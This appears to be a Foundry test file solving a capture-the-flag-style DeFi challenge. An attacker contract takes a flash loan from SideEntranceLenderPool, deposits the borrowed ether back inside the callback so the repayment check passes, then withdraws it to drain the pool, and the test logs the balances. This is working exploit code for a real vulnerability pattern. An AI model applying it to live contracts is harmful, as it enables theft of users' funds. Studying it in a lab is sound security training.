// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {SideEntranceLenderPool} from "../src/SideEntranceLenderPool.sol";


interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Attacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    
    constructor(SideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function execute() external payable {
        pool.deposit{value: 1000 ether}();
    }

    function _execute() external payable {
        pool.flashLoan(1000 ether);
    }

    function withdraw() public{
        pool.withdraw();
    }

    receive() external payable{}
}

contract TestSideEntrance is Test {
    SideEntranceLenderPool pool;
    Attacker attacker;

    address user = makeAddr("user");
    uint256 ETHER_IN_POOL = 1000 ether;

    function setUp() public {
        pool = new SideEntranceLenderPool();
        attacker = new Attacker(pool);
        vm.deal(address(pool), ETHER_IN_POOL);
        vm.deal(user, 1 ether);

        assertEq(address(pool).balance, ETHER_IN_POOL);
    }

    function test__CanDrainPool() public {
        //Checking that deposits and withdraw works properly
        vm.startPrank(user);
        console.log(address(pool).balance);
        pool.deposit {value: 0.05 ether}();
        console.log(address(pool).balance);
        pool.withdraw();
        vm.stopPrank();

        //Using the attack contract to take a flashloan
        vm.prank(user);
        console.log(address(pool).balance);
        attacker._execute();
        console.log(address(pool).balance);
        attacker.withdraw();
        console.log(address(pool).balance); //This proves that the pool has been draines successful
        vm.stopPrank();
    }
}
